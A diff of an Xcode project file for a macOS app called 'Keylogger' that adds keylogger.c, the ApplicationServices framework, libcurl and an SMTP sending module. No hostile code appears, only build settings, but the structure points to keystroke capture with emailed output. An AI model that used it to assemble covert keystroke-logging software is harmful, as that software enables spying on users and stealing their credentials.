@@ -7,12 +7,25 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		5F03F6421ABC50E6009DBFA3 /* libcurl.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F6411ABC50E6009DBFA3 /* libcurl.a */; };
+		5F03F6431ABC50E6009DBFA3 /* libcurl.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F6411ABC50E6009DBFA3 /* libcurl.a */; };
+		5F03F6451ABC510A009DBFA3 /* libz.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F6441ABC510A009DBFA3 /* libz.dylib */; };
+		5F03F6471ABC5111009DBFA3 /* Security.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F6461ABC5111009DBFA3 /* Security.framework */; };
+		5F03F64C1ABC51AB009DBFA3 /* smtp-multi.c in Sources */ = {isa = PBXBuildFile; fileRef = 5F03F64B1ABC51AB009DBFA3 /* smtp-multi.c */; };
+		5F03F64D1ABC51AB009DBFA3 /* smtp-multi.c in Sources */ = {isa = PBXBuildFile; fileRef = 5F03F64B1ABC51AB009DBFA3 /* smtp-multi.c */; };
+		5F03F64F1ABC522B009DBFA3 /* Security.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F6461ABC5111009DBFA3 /* Security.framework */; };
+		5F03F6501ABC5231009DBFA3 /* libz.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F6441ABC510A009DBFA3 /* libz.dylib */; };
+		5F03F65D1ABC615F009DBFA3 /* libcurl.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F65C1ABC615F009DBFA3 /* libcurl.a */; };
+		5F03F65E1ABC615F009DBFA3 /* libcurl.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F03F65C1ABC615F009DBFA3 /* libcurl.a */; };
 		5F331D611ABB16370027C655 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 5F331D601ABB16370027C655 /* AppDelegate.m */; };
 		5F331D631ABB16370027C655 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 5F331D621ABB16370027C655 /* main.m */; };
 		5F331D661ABB16370027C655 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 5F331D651ABB16370027C655 /* ViewController.m */; };
 		5F331D681ABB16370027C655 /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5F331D671ABB16370027C655 /* Images.xcassets */; };
 		5F331D6B1ABB16370027C655 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 5F331D691ABB16370027C655 /* Main.storyboard */; };
 		5F331D771ABB16370027C655 /* KeyloggerTests.m in Sources */ = {isa = PBXBuildFile; fileRef = 5F331D761ABB16370027C655 /* KeyloggerTests.m */; };
+		5F331D851ABB17F10027C655 /* WindowController.m in Sources */ = {isa = PBXBuildFile; fileRef = 5F331D841ABB17F10027C655 /* WindowController.m */; };
+		5F331D871ABB196F0027C655 /* ApplicationServices.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F331D861ABB196F0027C655 /* ApplicationServices.framework */; };
+		5F331D891ABB198F0027C655 /* keylogger.c in Sources */ = {isa = PBXBuildFile; fileRef = 5F331D881ABB198F0027C655 /* keylogger.c */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -26,6 +39,30 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		5F03F6371ABC50E6009DBFA3 /* curl.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curl.h; sourceTree = "<group>"; };
+		5F03F6381ABC50E6009DBFA3 /* curlbuild.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curlbuild.h; sourceTree = "<group>"; };
+		5F03F6391ABC50E6009DBFA3 /* curlrules.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curlrules.h; sourceTree = "<group>"; };
+		5F03F63A1ABC50E6009DBFA3 /* curlver.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curlver.h; sourceTree = "<group>"; };
+		5F03F63B1ABC50E6009DBFA3 /* easy.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = easy.h; sourceTree = "<group>"; };
+		5F03F63C1ABC50E6009DBFA3 /* mprintf.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = mprintf.h; sourceTree = "<group>"; };
+		5F03F63D1ABC50E6009DBFA3 /* multi.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = multi.h; sourceTree = "<group>"; };
+		5F03F63E1ABC50E6009DBFA3 /* stdcheaders.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = stdcheaders.h; sourceTree = "<group>"; };
+		5F03F63F1ABC50E6009DBFA3 /* typecheck-gcc.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "typecheck-gcc.h"; sourceTree = "<group>"; };
+		5F03F6411ABC50E6009DBFA3 /* libcurl.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = libcurl.a; sourceTree = "<group>"; };
+		5F03F6441ABC510A009DBFA3 /* libz.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libz.dylib; path = usr/lib/libz.dylib; sourceTree = SDKROOT; };
+		5F03F6461ABC5111009DBFA3 /* Security.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Security.framework; path = System/Library/Frameworks/Security.framework; sourceTree = SDKROOT; };
+		5F03F64B1ABC51AB009DBFA3 /* smtp-multi.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = "smtp-multi.c"; sourceTree = "<group>"; };
+		5F03F64E1ABC51C7009DBFA3 /* smtp-multi.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "smtp-multi.h"; sourceTree = "<group>"; };
+		5F03F6521ABC615F009DBFA3 /* curl.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curl.h; sourceTree = "<group>"; };
+		5F03F6531ABC615F009DBFA3 /* curlbuild.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curlbuild.h; sourceTree = "<group>"; };
+		5F03F6541ABC615F009DBFA3 /* curlrules.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curlrules.h; sourceTree = "<group>"; };
+		5F03F6551ABC615F009DBFA3 /* curlver.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = curlver.h; sourceTree = "<group>"; };
+		5F03F6561ABC615F009DBFA3 /* easy.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = easy.h; sourceTree = "<group>"; };
+		5F03F6571ABC615F009DBFA3 /* mprintf.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = mprintf.h; sourceTree = "<group>"; };
+		5F03F6581ABC615F009DBFA3 /* multi.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = multi.h; sourceTree = "<group>"; };
+		5F03F6591ABC615F009DBFA3 /* stdcheaders.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = stdcheaders.h; sourceTree = "<group>"; };
+		5F03F65A1ABC615F009DBFA3 /* typecheck-gcc.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "typecheck-gcc.h"; sourceTree = "<group>"; };
+		5F03F65C1ABC615F009DBFA3 /* libcurl.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = libcurl.a; sourceTree = "<group>"; };
 		5F331D5A1ABB16360027C655 /* Keylogger.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Keylogger.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		5F331D5E1ABB16370027C655 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		5F331D5F1ABB16370027C655 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
@@ -38,6 +75,11 @@
 		5F331D701ABB16370027C655 /* KeyloggerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = KeyloggerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		5F331D751ABB16370027C655 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		5F331D761ABB16370027C655 /* KeyloggerTests.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = KeyloggerTests.m; sourceTree = "<group>"; };
+		5F331D831ABB17F10027C655 /* WindowController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WindowController.h; sourceTree = "<group>"; };
+		5F331D841ABB17F10027C655 /* WindowController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WindowController.m; sourceTree = "<group>"; };
+		5F331D861ABB196F0027C655 /* ApplicationServices.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ApplicationServices.framework; path = System/Library/Frameworks/ApplicationServices.framework; sourceTree = SDKROOT; };
+		5F331D881ABB198F0027C655 /* keylogger.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = keylogger.c; sourceTree = "<group>"; };
+		5F331D8A1ABB19DA0027C655 /* keylogger.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = keylogger.h; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -45,6 +87,11 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5F03F65D1ABC615F009DBFA3 /* libcurl.a in Frameworks */,
+				5F03F6471ABC5111009DBFA3 /* Security.framework in Frameworks */,
+				5F03F6451ABC510A009DBFA3 /* libz.dylib in Frameworks */,
+				5F331D871ABB196F0027C655 /* ApplicationServices.framework in Frameworks */,
+				5F03F6421ABC50E6009DBFA3 /* libcurl.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -52,15 +99,72 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5F03F6501ABC5231009DBFA3 /* libz.dylib in Frameworks */,
+				5F03F65E1ABC615F009DBFA3 /* libcurl.a in Frameworks */,
+				5F03F64F1ABC522B009DBFA3 /* Security.framework in Frameworks */,
+				5F03F6431ABC50E6009DBFA3 /* libcurl.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		5F03F6361ABC50E6009DBFA3 /* include */ = {
+			isa = PBXGroup;
+			children = (
+				5F03F6371ABC50E6009DBFA3 /* curl.h */,
+				5F03F6381ABC50E6009DBFA3 /* curlbuild.h */,
+				5F03F6391ABC50E6009DBFA3 /* curlrules.h */,
+				5F03F63A1ABC50E6009DBFA3 /* curlver.h */,
+				5F03F63B1ABC50E6009DBFA3 /* easy.h */,
+				5F03F63C1ABC50E6009DBFA3 /* mprintf.h */,
+				5F03F63D1ABC50E6009DBFA3 /* multi.h */,
+				5F03F63E1ABC50E6009DBFA3 /* stdcheaders.h */,
+				5F03F63F1ABC50E6009DBFA3 /* typecheck-gcc.h */,
+			);
+			name = include;
+			path = "../../../../Downloads/curl-ios-build-scripts-master/curl/osx/include";
+			sourceTree = "<group>";
+		};
+		5F03F6401ABC50E6009DBFA3 /* lib */ = {
+			isa = PBXGroup;
+			children = (
+				5F03F6411ABC50E6009DBFA3 /* libcurl.a */,
+			);
+			name = lib;
+			path = "../../../../Downloads/curl-ios-build-scripts-master/curl/osx/lib";
+			sourceTree = "<group>";
+		};
+		5F03F6511ABC615F009DBFA3 /* include */ = {
+			isa = PBXGroup;
+			children = (
+				5F03F6521ABC615F009DBFA3 /* curl.h */,
+				5F03F6531ABC615F009DBFA3 /* curlbuild.h */,
+				5F03F6541ABC615F009DBFA3 /* curlrules.h */,
+				5F03F6551ABC615F009DBFA3 /* curlver.h */,
+				5F03F6561ABC615F009DBFA3 /* easy.h */,
+				5F03F6571ABC615F009DBFA3 /* mprintf.h */,
+				5F03F6581ABC615F009DBFA3 /* multi.h */,
+				5F03F6591ABC615F009DBFA3 /* stdcheaders.h */,
+				5F03F65A1ABC615F009DBFA3 /* typecheck-gcc.h */,
+			);
+			path = include;
+			sourceTree = "<group>";
+		};
+		5F03F65B1ABC615F009DBFA3 /* lib */ = {
+			isa = PBXGroup;
+			children = (
+				5F03F65C1ABC615F009DBFA3 /* libcurl.a */,
+			);
+			path = lib;
+			sourceTree = "<group>";
+		};
 		5F331D511ABB16360027C655 = {
 			isa = PBXGroup;
 			children = (
+				5F03F6461ABC5111009DBFA3 /* Security.framework */,
+				5F03F6441ABC510A009DBFA3 /* libz.dylib */,
+				5F331D861ABB196F0027C655 /* ApplicationServices.framework */,
 				5F331D5C1ABB16360027C655 /* Keylogger */,
 				5F331D731ABB16370027C655 /* KeyloggerTests */,
 				5F331D5B1ABB16360027C655 /* Products */,
@@ -79,6 +183,14 @@
 		5F331D5C1ABB16360027C655 /* Keylogger */ = {
 			isa = PBXGroup;
 			children = (
+				5F03F6511ABC615F009DBFA3 /* include */,
+				5F03F65B1ABC615F009DBFA3 /* lib */,
+				5F03F64B1ABC51AB009DBFA3 /* smtp-multi.c */,
+				5F03F64E1ABC51C7009DBFA3 /* smtp-multi.h */,
+				5F03F6361ABC50E6009DBFA3 /* include */,
+				5F03F6401ABC50E6009DBFA3 /* lib */,
+				5F331D881ABB198F0027C655 /* keylogger.c */,
+				5F331D8A1ABB19DA0027C655 /* keylogger.h */,
 				5F331D5F1ABB16370027C655 /* AppDelegate.h */,
 				5F331D601ABB16370027C655 /* AppDelegate.m */,
 				5F331D641ABB16370027C655 /* ViewController.h */,
@@ -86,6 +198,8 @@
 				5F331D671ABB16370027C655 /* Images.xcassets */,
 				5F331D691ABB16370027C655 /* Main.storyboard */,
 				5F331D5D1ABB16360027C655 /* Supporting Files */,
+				5F331D831ABB17F10027C655 /* WindowController.h */,
+				5F331D841ABB17F10027C655 /* WindowController.m */,
 			);
 			path = Keylogger;
 			sourceTree = "<group>";
@@ -216,8 +330,11 @@
 			buildActionMask = 2147483647;
 			files = (
 				5F331D661ABB16370027C655 /* ViewController.m in Sources */,
+				5F03F64C1ABC51AB009DBFA3 /* smtp-multi.c in Sources */,
+				5F331D851ABB17F10027C655 /* WindowController.m in Sources */,
 				5F331D631ABB16370027C655 /* main.m in Sources */,
 				5F331D611ABB16370027C655 /* AppDelegate.m in Sources */,
+				5F331D891ABB198F0027C655 /* keylogger.c in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -226,6 +343,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				5F331D771ABB16370027C655 /* KeyloggerTests.m in Sources */,
+				5F03F64D1ABC51AB009DBFA3 /* smtp-multi.c in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -334,6 +452,11 @@
 				COMBINE_HIDPI_IMAGES = YES;
 				INFOPLIST_FILE = Keylogger/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/../Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"/Users/folja02/Downloads/curl-ios-build-scripts-master/curl/osx/lib",
+					"$(PROJECT_DIR)/Keylogger/lib",
+				);
 				PRODUCT_NAME = "$(TARGET_NAME)";
 			};
 			name = Debug;
@@ -345,6 +468,11 @@
 				COMBINE_HIDPI_IMAGES = YES;
 				INFOPLIST_FILE = Keylogger/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/../Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"/Users/folja02/Downloads/curl-ios-build-scripts-master/curl/osx/lib",
+					"$(PROJECT_DIR)/Keylogger/lib",
+				);
 				PRODUCT_NAME = "$(TARGET_NAME)";
 			};
 			name = Release;
@@ -364,6 +492,11 @@
 				);
 				INFOPLIST_FILE = KeyloggerTests/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/../Frameworks @loader_path/../Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"/Users/folja02/Downloads/curl-ios-build-scripts-master/curl/osx/lib",
+					"$(PROJECT_DIR)/Keylogger/lib",
+				);
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Keylogger.app/Contents/MacOS/Keylogger";
 			};
@@ -380,6 +513,11 @@
 				);
 				INFOPLIST_FILE = KeyloggerTests/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/../Frameworks @loader_path/../Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"/Users/folja02/Downloads/curl-ios-build-scripts-master/curl/osx/lib",
+					"$(PROJECT_DIR)/Keylogger/lib",
+				);
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Keylogger.app/Contents/MacOS/Keylogger";
 			};
@@ -404,6 +542,7 @@
 				5F331D7C1ABB16370027C655 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
 		};
 		5F331D7D1ABB16370027C655 /* Build configuration list for PBXNativeTarget "KeyloggerTests" */ = {
 			isa = XCConfigurationList;
@@ -412,6 +551,7 @@
 				5F331D7F1ABB16370027C655 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
 	};
